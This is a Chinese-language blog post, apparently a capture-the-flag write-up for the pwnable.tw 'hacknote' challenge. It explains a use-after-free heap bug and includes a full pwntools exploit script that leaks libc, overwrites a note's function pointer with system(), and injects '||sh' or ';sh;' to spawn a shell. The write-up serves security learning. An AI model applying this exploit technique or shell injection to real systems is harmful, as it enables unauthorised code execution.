<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="产生漏洞的原因是free后chunk未置零"><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/noise.css"><title>pwnable.tw hacknote | /home/5n1p3r0010</title><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-none-link" href="/tags/pwn/" rel="tag">pwn</a></div><div class="post-time">2019-03-22</div></div></div><div class="container post-header"><h1>pwnable.tw hacknote</h1></div><div class="container post-content"><p>产生漏洞的原因是free后chunk未置零</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">unsigned int sub_80487D4()</span><br><span class="line">&#123;</span><br><span class="line">  int index; &#x2F;&#x2F; [esp+4h] [ebp-14h]</span><br><span class="line">  char buf; &#x2F;&#x2F; [esp+8h] [ebp-10h]</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  index &#x3D; atoi(&amp;buf);</span><br><span class="line">  if ( index &lt; 0 || index &gt;&#x3D; global_idx )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( notelist[index] )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)notelist[index] + 1));      &#x2F;&#x2F; free content</span><br><span class="line">                                                &#x2F;&#x2F; free后chunk未置零，uaf</span><br><span class="line">    free(notelist[index]);</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结构体如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ptr[i]-&gt;struct    &#x2F;&#x2F;i&lt;5</span><br><span class="line">struct _note</span><br><span class="line">&#123;</span><br><span class="line">    func *addr;    &#x2F;&#x2F;0x804862b</span><br><span class="line">    int *content;</span><br><span class="line">&#125;note;</span><br></pre></td></tr></table></figure>

<p>利用的思路</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">note0:    addr(8)+content(16)</span><br><span class="line">note1:    addr(8)+content(16)</span><br><span class="line">free note1,note0</span><br><span class="line">8byte&#39;s gadget in fastbin:note0-&gt;note1</span><br><span class="line">note2:    addr(8)+content(8)        &#x2F;&#x2F;content(8) modified to trigger a func_call puts(&#39;read@got&#39;),</span><br><span class="line">                &#x2F;&#x2F;read the recv to calculate the libc_baseprint(note1)free note2</span><br><span class="line">8byte&#39;s gadget in fastbin:note2&#39;s func_ptr-&gt;note2&#39;s content(aka note1&#39;s func_ptr)</span><br><span class="line">note3:    addr(8)+content(8)        &#x2F;&#x2F;note3&#39;s content(8) returns the note1&#39;s func_ptr,</span><br><span class="line">                &#x2F;&#x2F;modify it to trigger a call system(&#39;||sh&#39;)</span><br><span class="line">print(note1)</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level&#x3D;&#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r&#x3D;remote(&#39;chall.pwnable.tw&#39;,10102)</span><br><span class="line">file&#x3D;ELF(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc_32.so.6&#39;)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">r&#x3D;process(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">file&#x3D;ELF(&#39;.&#x2F;hacknote&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.28.so&#39;)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">def add(len,content):</span><br><span class="line">    r.sendlineafter(&#39;Your choice :&#39;,&#39;1&#39;)</span><br><span class="line">    r.sendlineafter(&#39;Note size :&#39;,str(len))</span><br><span class="line">    r.sendafter(&#39;Content :&#39;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    r.sendlineafter(&#39;Your choice :&#39;,&#39;2&#39;)</span><br><span class="line">    r.sendlineafter(&#39;Index :&#39;,str(index))</span><br><span class="line"></span><br><span class="line">def print_note(index):</span><br><span class="line">    r.sendlineafter(&#39;Your choice :&#39;,&#39;3&#39;)</span><br><span class="line">    r.sendlineafter(&#39;Index :&#39;,str(index))</span><br><span class="line"></span><br><span class="line">add(16,&#39;a&#39;*16)    #note0</span><br><span class="line">add(16,&#39;a&#39;*16)    #note1</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">read_got&#x3D;file.got[&#39;read&#39;]</span><br><span class="line">fun_addr&#x3D;0x0804862B</span><br><span class="line">add(8,p32(fun_addr)+p32(read_got))</span><br><span class="line">print_note(1)</span><br><span class="line">read_addr&#x3D;int(u32(r.recv(4)))</span><br><span class="line">success(&#39;read_addr&#39;+hex(read_addr))</span><br><span class="line">sys_addr&#x3D;read_addr-libc.sym[&#39;read&#39;]+libc.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">#add(8,p32(sys_addr)+&#39;;sh;&#39;)</span><br><span class="line">add(8,p32(sys_addr)+&#39;||sh&#39;)</span><br><span class="line">print_note(1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p> ps:这里最后执行的system()调用是print_note函数里的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( notelist[index] )</span><br><span class="line">  (*(void (__cdecl **)(void *))notelist[index])(notelist[index]);</span><br></pre></td></tr></table></figure>

<p>即system传入的参数是notelist[index]，所以需要字符串截断；截断的方法是||</p>
<p>还有一种方法是利用命令注入传入;sh;（或$0等的参数，$0不能字符截断，这里不可行）</p>
<p>参考web中命令注入漏洞的利用</p>
